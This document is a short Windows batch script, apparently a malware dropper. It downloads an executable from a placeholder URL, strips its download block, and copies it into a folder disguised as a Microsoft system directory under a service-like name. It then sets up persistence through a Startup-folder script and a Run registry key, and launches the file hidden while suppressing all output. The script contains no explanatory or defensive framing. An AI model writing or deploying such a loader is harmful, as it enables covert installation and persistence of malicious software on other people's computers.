@echo off
curl -L -o "%TEMP%\WinNetSvcHost.exe" <download exe url> >nul 2>&1
powershell -c "Unblock-File -Path $env:TEMP\WinNetSvcHost.exe" >nul 2>&1
mkdir %LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\ >nul 2>&1
copy "%TEMP%\WinNetSvcHost.exe" "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe" >nul 2>&1
echo powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '' -WindowStyle Hidden" > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '' -WindowStyle Hidden" > "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinNetSvcHostStartup" /t REG_SZ /d "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd" /f >nul 2>&1
powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '' -WindowStyle Hidden" >nul 2>&1    